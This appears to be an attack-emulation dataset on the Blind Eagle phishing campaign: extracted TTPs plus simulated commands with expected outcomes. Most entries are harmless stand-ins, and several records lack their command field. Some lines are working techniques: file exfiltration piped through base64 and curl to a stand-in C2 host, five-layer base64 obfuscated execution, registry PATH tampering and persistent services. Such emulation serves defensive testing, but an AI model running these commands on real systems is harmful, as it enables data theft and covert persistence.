extracted_ttps.description: Blind Eagle uses phishing emails pretending to be from the Colombian government to trick victims into opening malicious documents or links
The infection chain proceeds as scheduled if the incoming request seems to arrive from Colombia
Attacker used PowerShell to download and execute additional scripts
The server responds to the client with a file for download, which is a malware executable hosted on the file-sharing service MediaFire
The malware uses Python scripts to load and run a Meterpreter sample, and also uses the 'cmd' command for execution.
The use of Wscript and cmd suggests that the attackers may be using command and scripting interpreters to execute commands

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The malware uses a C2 server to communicate with the infected system, which may involve exfiltrating data over the C2 channel.
Victims are tricked into executing the malicious payload by opening the attached PDF or clicking on the link
The malware uses homebrew encoding, which consists of base64 repeated 5 times, to obfuscate the Python scripts.
The malware tries to kill all processes related to the infection, which may involve discovering application windows.
Attacker modified the registry to add a new path to the system's PATH environment variable
Detected Phishing activity via NLP pattern matching
Detected PowerShell activity via NLP pattern matching
Detected commands and tools such as Net, Wscript, arp, at, cmd
Attacker used a malicious domain to host the next stage of the malware
The malware adds persistence to the system, which may involve modifying the registry.
The malware is downloaded and executed by the user, which involves user execution.
Attacker created a new scheduled task to run the malware
Attacker used mshta to execute Microsoft HTML Applications
Attacker used PowerShell to check the system version
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Windows Management Instrumentation activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Scheduled Task/Job activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

attacks.description: Opens a text file named 'phishing_document.txt' in Notepad, simulating a user opening a malicious document.
attacks.expected_behavior: Notepad opens with the specified file.

attacks.description: Opens a link in the default browser, simulating a user clicking on a phishing link. Note: This command uses .NET reflection which is generally discouraged but is included here for completeness as it directly relates to the phishing technique.
attacks.expected_behavior: The default web browser opens the specified link.

attacks.description: Creates a file named 'phishing_email.txt' in the temp directory with the content 'This is a phishing email.', simulating the creation of a malicious file.
attacks.expected_behavior: A file named 'phishing_email.txt' is created in the temp directory.

attacks.description: Downloads a malicious PDF file from a remote server and saves it to the user's home directory
attacks.expected_behavior: The command downloads the PDF file and saves it to the user's home directory. The user may be tricked into opening the file, potentially leading to malicious activity.

attacks.description: Downloads a malicious Word document from a remote server and saves it to the user's home directory
attacks.expected_behavior: The command downloads the Word document and saves it to the user's home directory. The user may be tricked into opening the file, potentially leading to malicious activity.

attacks.description: Opens a malicious HTML page in the user's default web browser
attacks.expected_behavior: The command opens the HTML page in the user's default web browser. The user may be tricked into interacting with the page, potentially leading to malicious activity.

attacks.description: Execute a local PowerShell script using Invoke-Item.
attacks.expected_behavior: The command executes a local PowerShell script named test.ps1 from the TEMP directory.

attacks.description: Start a new PowerShell process that writes 'Hello World' to the console.
attacks.expected_behavior: A new PowerShell window opens and prints 'Hello World' to the console.

attacks.description: Create or overwrite a file in the TEMP directory with specified content.
attacks.expected_behavior: A file named output.txt is created or overwritten in the TEMP directory with the content 'Test Content'.

attacks.description: Downloads a PowerShell script from a URL and executes it
attacks.expected_behavior: The script will be downloaded and executed, demonstrating the PowerShell technique

attacks.description: Executes a PowerShell script using Invoke-Expression
attacks.expected_behavior: The script will be executed, printing 'Hello World' to the console

attacks.description: Creates a directory, downloads a PowerShell script, and executes it
attacks.expected_behavior: The directory will be created, the script will be downloaded, and executed, demonstrating the PowerShell technique

attacks.description: Downloads a file from a URL and executes it using certutil and URL caching
attacks.expected_behavior: The command downloads a file and executes it, potentially leading to malicious activity

attacks.description: Opens a file using PowerShell's Invoke-Item cmdlet, simulating user execution
attacks.expected_behavior: The command opens a file, potentially leading to user interaction with malicious content

attacks.description: Executes a batch file using the start command, simulating user execution
attacks.expected_behavior: The command executes a batch file, potentially leading to malicious activity

attacks.description: Basic example of downloading and executing a malicious file using wget
attacks.expected_behavior: The user downloads a file, makes it executable, and runs it, potentially leading to malicious activity

attacks.description: Intermediate example of downloading and executing a malicious script using curl
attacks.expected_behavior: The user downloads a script, saves it, and executes it using bash, potentially leading to malicious activity

attacks.description: Advanced example of creating and executing a malicious Python script
attacks.expected_behavior: The user creates a Python script with malicious content and executes it using python3, potentially leading to malicious activity

attacks.description: Basic use of cmd to write a test string to a temporary file.
attacks.expected_behavior: Creates %TEMP%\test.txt containing the text 'Test command execution'.

attacks.description: Intermediate example: stores a base64‑encoded batch script, decodes it with certutil, executes it, then cleans up.
attacks.expected_behavior: Decodes to a batch file that echoes '@echo Initial Schedule Executed!' and runs it, producing that output in the console. Temporary files are removed afterward.

attacks.command: powershell -Command "Start-Process cmd.exe -ArgumentList '/c echo Meterpreter session simulated > %TEMP%\meterpreter.txt'"
attacks.description: Advanced example: PowerShell launches cmd to simulate a Meterpreter‑style payload by writing a marker file.
attacks.expected_behavior: Creates %TEMP%\meterpreter.txt containing the text 'Meterpreter session simulated'.

attacks.expected_behavior: Prints 'Hello World' to the console

attacks.description: Intermediate example that assumes a script.py exists in the current directory
attacks.expected_behavior: Executes the script.py if it exists in the current directory

attacks.description: Advanced example that uses Python to execute a system command

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration using base64 encoding and curl to send data to a C2 server.
attacks.expected_behavior: Exfiltrates test data to a specified C2 server URL.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration using tar for archiving, base64 for encoding, and curl for transmission.
attacks.expected_behavior: Archives and exfiltrates sensitive data to a C2 server, requiring admin privileges for accessing sensitive data.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: find /path/to/data -type f -print0 | xargs -0 -I {} base64 {} | curl -X POST -d @- http://c2server.com/exfil
attacks.description: Advanced exfiltration using find and xargs to encode and send multiple files to a C2 server.
attacks.expected_behavior: Exfiltrates multiple files from a specified directory to a C2 server, potentially requiring admin privileges and posing a higher risk due to the volume of data being exfiltrated.

attacks.command: echo 'print("Hello, World!")' | base64 | base64 | base64 | base64 | base64 > encoded_script.txt
attacks.description: Basic: Encode a simple Python script using base64 repeated 5 times and save it to a file
attacks.expected_behavior: The encoded script is saved to a file named encoded_script.txt

attacks.command: base64 -d encoded_script.txt | base64 -d | base64 -d | base64 -d | base64 -d | python
attacks.description: Intermediate: Decode the previously encoded script using base64 repeated 5 times and execute it using Python
attacks.expected_behavior: The decoded script is executed, printing "Hello, World!" to the console

attacks.command: echo 'import os; print("Obfuscated script executed!")' | base64 | base64 | base64 | base64 | base64 | tee encoded_script.txt; base64 -d encoded_script.txt | base64 -d | base64 -d | base64 -d | base64 -d | python
attacks.description: Advanced: Encode a more complex Python script using base64 repeated 5 times, save it to a file, and then decode and execute it
attacks.expected_behavior: The encoded script is saved to a file and then decoded and executed, printing "Obfuscated script executed!" to the console

attacks.description: Lists all running processes, including application windows
attacks.expected_behavior: Displays a list of running processes in the command prompt window

attacks.description: Uses PowerShell to get processes with a main window title, effectively discovering application windows
attacks.expected_behavior: Lists the main window titles of running applications in the PowerShell window

attacks.description: An advanced command that iterates through each process and attempts to write its main window title, handling potential errors silently
attacks.expected_behavior: Writes the main window titles of running applications to the PowerShell window, ignoring any errors that occur during execution

attacks.description: Enumerate all top-level windows and their children in the X11 window tree starting from the root window.
attacks.expected_behavior: Outputs a hierarchical list of all visible windows managed by the X server, including window IDs, geometry, and titles. Used to discover running GUI applications.

attacks.description: List all open windows with their window ID, desktop number, and window title using wmctrl.
attacks.expected_behavior: Prints a flat list of windows currently open in the desktop environment. Each line includes window ID, desktop identifier, and title, enabling discovery of active applications.

attacks.description: List all X11 client applications currently connected to the display, showing command lines used to start them.
attacks.expected_behavior: Displays detailed information about each X client, including the full command line invocation. This helps identify running GUI applications and their launch context.

attacks.description: Adds a new directory (C:\malicious\bin) to the system-wide PATH environment variable using reg.exe.
attacks.expected_behavior: The registry value HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path is updated to include the new path. The change takes effect after a logoff/logon or after broadcasting a WM_SETTINGCHANGE message.

attacks.description: Appends C:\malicious\bin to the current user's PATH variable via PowerShell without requiring elevation.
attacks.expected_behavior: The HKCU\Environment\Path value is updated for the logged‑in user, adding the new directory. The change is immediately visible to new processes launched by the user.

attacks.command: for /f "tokens=2*" %a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path ^| find "Path"') do set "old=%b" && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d "%old%;C:\malicious\bin" /f
attacks.description: Queries the existing system PATH, stores it in a variable, and appends C:\malicious\bin before writing it back using reg.exe.
attacks.expected_behavior: The command reads the current PATH from the registry, concatenates the new directory, and updates the HKLM PATH value. The modification requires admin rights and becomes effective after a logoff/logon or WM_SETTINGCHANGE broadcast.

attacks.description: Add a new path to the system's PATH environment variable
attacks.expected_behavior: The new path will be added to the system's PATH environment variable

attacks.description: Add a new path to the system's PATH environment variable and verify that it has been added
attacks.expected_behavior: The new path will be added to the system's PATH environment variable and the updated PATH variable will be printed to the console

attacks.description: Add a new path to the system's PATH environment variable and use it to execute a command
attacks.expected_behavior: The new path will be added to the system's PATH environment variable and the command will be executed from the new path

attacks.description: Lists all running processes using PowerShell
attacks.expected_behavior: Displays a list of running processes

attacks.expected_behavior: Displays the current date and time

attacks.description: Advanced command to download a webpage using PowerShell on Linux, assuming internet access

attacks.description: Use bitsadmin to fetch a payload from a malicious domain and launch it, representing a common BITS-based download technique.

attacks.command: sc create TestService binPath= "C:\\Windows\\System32\\notepad.exe" start= auto
attacks.description: Creates a new Windows service named TestService that runs Notepad.exe automatically at system start.
attacks.expected_behavior: A new service appears in services.msc named "TestService" with startup type Automatic; Notepad.exe is launched as a service process.

attacks.description: Uses PowerShell to register a service called TestServicePS that executes Notepad.exe.
attacks.expected_behavior: The service "TestServicePS" is created and visible via Get-Service; it starts Notepad.exe when the system boots.

attacks.command: sc create EvilService binPath= "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process notepad.exe\"" start= demand
attacks.description: Creates a service named EvilService that launches PowerShell, which in turn starts Notepad.exe; demonstrates embedding a command line in the service binary path.
attacks.expected_behavior: Service "EvilService" is registered; when started manually or on demand, it runs PowerShell which launches Notepad.exe as a separate process.

attacks.command:
sudo bash -c 'cat <<"EOF" > /etc/systemd/system/malicious.service
[Unit]
Description=Malicious Test Service
After=network.target
[Service]
ExecStart=/bin/sleep 7200
Restart=always
[Install]
WantedBy=multi-user.target
EOF'
&& sudo systemctl daemon-reload && sudo systemctl enable malicious.service && sudo systemctl start malicious.service
attacks.description: Write a system‑wide systemd unit file to /etc/systemd/system, reload the daemon, enable, and start the service to achieve persistence with root privileges.
attacks.expected_behavior: A new system service "malicious.service" is installed, enabled to start at boot, and started immediately. It runs "sleep 7200" and will be restarted automatically if it exits.

attacks.command:
sudo bash -c 'cat <<"EOF" > /etc/init.d/legacy_service
#!/bin/sh
### BEGIN INIT INFO
# Provides:          legacy_service
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Legacy test service
# Description:       Runs a harmless sleep command as a SysV init script.
### END INIT INFO

case "$1" in
  start)
    echo "Starting legacy_service"
    /bin/sleep 1800 &
    ;;
  stop)
    echo "Stopping legacy_service"
    pkill -f "/bin/sleep 1800"
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
    ;;
esac
exit 0
EOF'
&& sudo chmod +x /etc/init.d/legacy_service && sudo update-rc.d legacy_service defaults && sudo service legacy_service start
attacks.description: Create a SysV init script in /etc/init.d, make it executable, register it with update-rc.d for run‑level start, and start it, providing persistence on older init systems.
attacks.expected_behavior: A legacy init script "legacy_service" is installed, enabled for default runlevels, and started. It launches a background "sleep 1800" process, persisting until the system reboots.

attacks.command: echo -e '#!/bin/bash\necho "User execution test: benign script"' > $HOME/test.sh && chmod +x $HOME/test.sh && $HOME/test.sh

attacks.command:
cat <<'EOF' > $HOME/malicious.sh
#!/bin/bash
# Simulated malicious payload
echo "Simulated malicious action executed"
EOF
chmod +x $HOME/malicious.sh && $HOME/malicious.sh
attacks.description: Writes a multi-line bash script that mimics a malicious payload, marks it executable, and runs it, representing a user double‑clicking a malicious file.
attacks.expected_behavior: The script outputs "Simulated malicious action executed" indicating the payload was run.

attacks.description: Copies a legitimate system binary to a new name that appears benign, makes it executable, and runs it, emulating a user executing a disguised malicious executable.
attacks.expected_behavior: The copied binary exits with status 0 (no visible output), demonstrating execution of a file that could be malicious in a real scenario.
